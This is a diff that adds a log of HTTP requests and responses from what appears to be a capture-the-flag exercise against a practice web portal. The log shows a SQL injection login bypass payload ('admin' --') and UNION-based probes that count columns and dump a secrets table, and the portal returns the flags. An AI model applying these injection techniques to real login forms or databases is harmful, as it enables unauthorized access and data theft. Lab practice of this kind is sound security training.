@@ -1,0 +1,50 @@
+UTC: 2026-11-20T01:45:05+00:00
+
+=== R1: POST /login ? bypass ===
+Payload: user=admin' -- ; pass=not-the-password
+HTTP/1.0 200 OK
+Server: PhantomPortal/1.0 
+Date: Fri, 20 Nov 2026 01:45:05 GMT
+Content-Type: text/plain; charset=utf-8
+
+Bienvenido admin (rol: admin).
+Panel de administracion desbloqueado: FLAG{sqli_auth_bypass}
+
+=== R2: GET /buscar baseline ===
+HTTP/1.0 200 OK
+Server: PhantomPortal/1.0 
+Date: Fri, 20 Nov 2026 01:45:05 GMT
+Content-Type: text/plain; charset=utf-8
+
+Resultados:
+  Router industrial - $1200
+=== R2: UNION arity probe: two columns ===
+HTTP/1.0 200 OK
+Server: PhantomPortal/1.0 
+Date: Fri, 20 Nov 2026 01:45:05 GMT
+Content-Type: text/plain; charset=utf-8
+
+Resultados:
+  1 - $2
+=== R2: UNION arity probe: three columns ===
+HTTP/1.0 200 OK
+Server: PhantomPortal/1.0 
+Date: Fri, 20 Nov 2026 01:45:05 GMT
+Content-Type: text/plain; charset=utf-8
+
+Error SQL: SELECTs to the left and right of UNION do not have the same number of result columns
+=== R2: secrets table probe ===
+HTTP/1.0 200 OK
+Server: PhantomPortal/1.0 
+Date: Fri, 20 Nov 2026 01:45:05 GMT
+Content-Type: text/plain; charset=utf-8
+
+Resultados:
+  flag_union - $FLAG{sqli_union_dump}
+=== R2: field-name probe (rejected) ===
+HTTP/1.0 200 OK
+Server: PhantomPortal/1.0 
+Date: Fri, 20 Nov 2026 01:45:05 GMT
+Content-Type: text/plain; charset=utf-8
+
+Error SQL: no such column: name
